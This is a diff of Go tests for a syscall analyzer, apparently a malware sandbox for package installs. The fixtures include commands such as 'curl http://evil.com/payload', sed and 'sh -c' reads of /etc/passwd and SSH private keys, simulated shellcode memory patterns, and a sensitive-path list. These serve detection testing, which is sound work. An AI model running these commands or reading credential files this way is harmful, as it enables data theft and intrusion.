@@ -84,18 +84,56 @@ func TestAnalyze_FiltersBenignExec(t *testing.T) {
 	}
 }
 
-func TestAnalyze_SuspiciousExec(t *testing.T) {
-	events := []types.SyscallEvent{
+// TestAnalyze_CurlMultiLayerDefense documents the multi-layer defense
+// model for network tools like curl during install:
+//
+//   - Layer 1 (containment): the sandbox enforces --network=none, so
+//     curl cannot actually reach the destination.
+//   - Layer 2 (harm-firing detection): the connect() syscall fires
+//     regardless of network availability and is classified as
+//     c2_communication (HIGH).
+//   - Layer 3 (forensic chain): the curl execve itself is still
+//     recorded as CategoryUnknownBinary (LOW) so the analyst sees the
+//     full process tree, but it does not flip the verdict on its own
+//     (avoids classifying every binary kojuto doesn't recognize as
+//     malicious — see classifyExecve rationale).
+//
+// Realistic malicious curl always triggers a connect() and so trips
+// Layer 2. Curl invoked in isolation (without any network call) is
+// not malicious and correctly stays clean.
+func TestAnalyze_CurlMultiLayerDefense(t *testing.T) {
+	// Curl execve in isolation: no harm-firing syscall captured.
+	// Recorded for forensic visibility, but verdict stays clean.
+	curlAlone := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl --version"},
+	}
+	verdict, filtered := Analyze(curlAlone)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for execve-only (Layer 3 forensic record), got %s", verdict)
+	}
+	if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
+		t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
+	}
+
+	// Realistic malicious curl: execve + connect. Layer 2
+	// (c2_communication on the connect) flips the verdict.
+	curlWithConnect := []types.SyscallEvent{
 		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
+		{Syscall: types.EventConnect, DstAddr: "203.0.113.42", DstPort: 443, Family: 2},
 	}
-
-	verdict, filtered := Analyze(events)
+	verdict, filtered = Analyze(curlWithConnect)
 	if verdict != types.VerdictSuspicious {
-		t.Errorf("expected suspicious for curl, got %s", verdict)
+		t.Errorf("expected suspicious when connect fires (Layer 2), got %s", verdict)
 	}
-
-	if len(filtered) != 1 {
-		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
+	var sawC2 bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryC2 {
+			sawC2 = true
+			break
+		}
+	}
+	if !sawC2 {
+		t.Errorf("expected a c2_communication event in %v", filtered)
 	}
 }
 
@@ -378,15 +416,57 @@ func TestShannonEntropy(t *testing.T) {
 	}
 }
 
-func TestAnalyze_SedExcluded(t *testing.T) {
-	// sed is excluded from benignPaths because GNU sed -e can execute shell commands.
-	events := []types.SyscallEvent{
-		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /etc/passwd"},
+// TestAnalyze_SedShellExecDefense documents that sed's shell-execution
+// abuse (e.g. `sed -e '1e cat /etc/passwd'`) is caught by the
+// harm-firing layer when sed actually spawns a shell, not by a
+// blanket sed-is-suspicious rule.
+//
+// sed in isolation is recorded as CategoryUnknownBinary (LOW) —
+// legitimate build scripts (autoconf, configure, make) invoke sed
+// constantly and we cannot blanket-flag sed without huge FP in source
+// builds. When sed's `e` command actually fires, the spawned `sh -c
+// <cmd>` is observed as a separate execve event and trips the
+// existing sh -c branch (HIGH), preserving detection.
+func TestAnalyze_SedShellExecDefense(t *testing.T) {
+	// sed alone is recorded for forensics but does not flip the
+	// verdict — there is no observable harm yet.
+	sedAlone := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e s/foo/bar/ input"},
+	}
+	verdict, filtered := Analyze(sedAlone)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for sed in isolation, got %s", verdict)
+	}
+	if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
+		t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
 	}
 
-	verdict, _ := Analyze(events)
+	// sed's `e` command actually fires a shell that touches a
+	// sensitive path. The harm layer (sh -c branch of classifyExecve,
+	// triggered because argsTouchSensitivePath fails the benign
+	// check) flips the verdict on the spawned shell. The sed parent
+	// stays LOW; detection comes from the shell event.
+	orig := sensitivePathPatterns
+	defer func() { sensitivePathPatterns = orig }()
+	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})
+
+	sedSpawnsShell := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /home/dev/.ssh/id_rsa input"},
+		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
+	}
+	verdict, filtered = Analyze(sedSpawnsShell)
 	if verdict != types.VerdictSuspicious {
-		t.Errorf("expected suspicious for sed, got %s", verdict)
+		t.Errorf("expected suspicious when sed spawns sh -c reading .ssh (Layer 2), got %s", verdict)
+	}
+	var sawCodeExec bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryCodeExecution {
+			sawCodeExec = true
+			break
+		}
+	}
+	if !sawCodeExec {
+		t.Errorf("expected code_execution event from spawned shell in %v", filtered)
 	}
 }
 
@@ -1035,6 +1115,86 @@ func TestAnalyze_ShellCmdSensitivePath(t *testing.T) {
 	}
 	if filtered[0].Category != types.CategoryCodeExecution {
 		t.Errorf("expected category %q, got %q", types.CategoryCodeExecution, filtered[0].Category)
+	}
+}
+
+// TestAnalyze_V8JITFilter documents the PID-based filter for V8 JIT
+// pages: simultaneous RWX mprotect/mmap from a Node interpreter is
+// legitimate code generation, not shellcode injection. The filter
+// requires that the same PID appear as the target of a prior execve
+// for a known JIT interpreter — an attacker cannot inject fake PIDs
+// into the strace stream, so this cannot be bypassed by spoofing.
+func TestAnalyze_V8JITFilter(t *testing.T) {
+	// Node JIT pattern: execve /usr/bin/node, then the same PID
+	// emits RWX mprotect/mmap. Must NOT flip the verdict.
+	nodePID := uint32(1234)
+	jitFromNode := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", Cmdline: "node /install/node_modules/lodash/index.js", PID: nodePID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: nodePID},
+		{Syscall: types.EventMmap, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", MemFlags: "MAP_PRIVATE|MAP_ANONYMOUS", PID: nodePID},
+	}
+	verdict, _ := Analyze(jitFromNode)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean when RWX comes from node PID (V8 JIT), got %s", verdict)
+	}
+
+	// Shellcode injection pattern: RWX from a PID whose execve was NOT
+	// a JIT interpreter. Must STILL trip memory_execution.
+	payloadPID := uint32(5678)
+	shellcodeFromPayload := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/install/node_modules/evil/payload", Cmdline: "payload", PID: payloadPID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: payloadPID},
+	}
+	verdict, filtered := Analyze(shellcodeFromPayload)
+	if verdict != types.VerdictSuspicious {
+		t.Errorf("expected suspicious when RWX from non-JIT PID, got %s", verdict)
+	}
+	var sawMemExec bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryMemExec {
+			sawMemExec = true
+			break
+		}
+	}
+	if !sawMemExec {
+		t.Errorf("expected memory_execution event in %v", filtered)
+	}
+
+	// PID=0 (main strace target, parser miss) does NOT get the JIT
+	// pass — the existing shellcode detection still fires. This
+	// preserves the original behavior for events the parser failed
+	// to attribute.
+	rwxNoPID := []types.SyscallEvent{
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: 0},
+	}
+	verdict, _ = Analyze(rwxNoPID)
+	if verdict != types.VerdictSuspicious {
+		t.Errorf("expected suspicious for unattributed RWX (PID=0), got %s", verdict)
+	}
+}
+
+// Unrecognized binary execve (find, dirname, arbitrary tools) that
+// reaches the default branch of classifyExecve is recorded at LOW
+// severity (CategoryUnknownBinary) and must not flip the verdict on
+// its own. This documents the L570 default-branch demotion decided in
+// the classifyExecve rationale.
+func TestAnalyze_UnknownBinaryStaysClean(t *testing.T) {
+	events := []types.SyscallEvent{
+		{
+			Syscall: types.EventExecve,
+			Comm:    "/usr/bin/find",
+			Cmdline: "find /install/node_modules -name package.json",
+		},
+	}
+	verdict, filtered := Analyze(events)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for unknown binary (LOW-only events), got %s", verdict)
+	}
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event recorded for forensic visibility, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryUnknownBinary {
+		t.Errorf("expected category %q, got %q", types.CategoryUnknownBinary, filtered[0].Category)
 	}
 }
 
